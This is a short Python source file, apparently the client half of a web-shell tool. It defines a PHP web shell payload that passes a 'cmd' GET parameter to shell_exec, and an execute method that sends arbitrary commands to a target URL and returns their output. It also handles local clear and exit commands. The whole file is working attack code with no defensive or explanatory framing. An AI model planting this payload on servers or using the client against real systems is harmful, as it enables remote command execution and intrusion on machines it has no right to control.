import subprocess
import requests
import sys
import os


class Shell:

    PAYLOAD = '<?php echo shell_exec($_GET["cmd"]); ?>'

    @staticmethod
    def execute(url, cmd):
        cmd_stripped = cmd.strip().strip(' ')

        if len(cmd_stripped) == 0:
            return

        if cmd_stripped == 'cls' or cmd_stripped == 'clear':
            if os.name == 'nt':
                subprocess.call('cls', shell=True)
            else:
                print(end='\x1b[2J')
            return

        elif cmd_stripped == 'exit' or cmd_stripped == 'quit':
            sys.exit(0)

        return requests.get(url, params={'cmd': cmd}).text
